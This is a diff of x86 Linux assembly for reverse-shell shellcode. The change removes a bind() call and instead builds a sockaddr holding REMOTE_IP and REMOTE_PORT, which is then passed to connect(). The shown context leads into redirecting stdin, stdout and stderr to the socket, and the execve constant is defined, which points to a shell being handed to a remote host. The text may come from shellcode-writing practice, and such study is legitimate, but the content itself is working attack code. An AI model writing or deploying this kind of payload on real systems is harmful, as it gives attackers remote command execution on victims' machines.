@@ -10,7 +10,6 @@ global _start
         AF_INET		equ 2
         SOCK_STREAM 	equ 1
         SYS_SOCKET 	equ 359
-        SYS_BIND 	equ 361
 	SYS_CONNECT	equ 362
         SYS_DUP2 	equ 63
         SYS_EXECVE 	equ 11
@@ -26,29 +25,19 @@ _start:
 	xor edx, edx		; protocol = 0
 	int 0x80
 
-	; Minimum viable struct sockaddr_in
-	; We'll say that it's 16 bytes long but it should ignore trailing data?
-	push edx 		; 0x00000000 = IPADDR_ANY
-	push dx			; 0x0000 = choose an ephemeral port
+	; Minimum viable struct sockaddr_in, filling in first 8 bytes
+	; We'll say that it's 16 bytes long but it should ignore trailing data
+	push dword REMOTE_IP
+	push word REMOTE_PORT
 	push bx			; 0x0002 = AF_INET from before
 
 	mov ebx, eax		; Save socket fd in EBX for next call
-	
-	; Bind to all interfaces and ephemeral port for outgoing connection
-	mov ax, SYS_BIND	; syscall
-	; EBX = sockfd aleady
-	mov ecx, esp		; esp points to start of sockaddr
-	mov dl, 16   		; addrlen = sizeof(struct sockaddr) = 16
-	int 0x80		; assume bind worked, eax = 0
-
-	; Re-use our sockaddr with the target port and address
-	mov word [ecx+2], REMOTE_PORT
-	mov dword [ecx+4], REMOTE_IP
 
 	; Establish a connection
 	mov ax, SYS_CONNECT
-	; Parameters are the same as bind() - sockfd, ptr to sockaddr, addrlen
-	; Having updated the sockaddr, they are now all set correctly
+	; EBX = sockfd
+	mov ecx, esp		; top of stack is the address structure
+	mov dl, 16		; pretend it's 16 bytes
 	int 0x80		; assume connection worked, EAX = 0
 
 	; Redirect STDIN, STDOUT and STDERR to the client socket
